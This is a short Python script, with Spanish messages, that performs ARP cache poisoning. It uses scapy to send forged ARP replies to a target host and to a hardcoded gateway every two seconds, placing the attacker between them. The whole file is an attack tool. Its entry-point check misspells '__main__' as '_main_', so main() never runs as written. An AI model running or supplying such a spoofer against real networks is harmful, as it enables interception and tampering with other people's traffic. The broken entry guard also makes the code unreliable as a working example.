import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal
import sys
import re

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer Mejorado")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP a suplantar")
    args = parser.parse_args()

    # Validar dirección IP
    if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", args.ip_address):
        print(colored("[!] Dirección IP no válida.", "red"))
        sys.exit(1)

    return args

def spoof(target_ip, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    try:
        scapy.send(arp_packet, verbose=False)
        print(colored(f"[+] Paquete ARP enviado: {spoof_ip} -> {target_ip}", "green"))
    except Exception as e:
        print(colored(f"[!] Error al enviar paquete ARP: {e}", "red"))

def main():
    arguments = get_arguments()

    target_ip = arguments.ip_address
    gateway_ip = "192.168.1.1"  # Se puede hacer dinámico si se desea

    print(colored(f"[+] Iniciando suplantación ARP entre {target_ip} y {gateway_ip}", "blue"))

    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)

if __name__ == '_main_':
    main()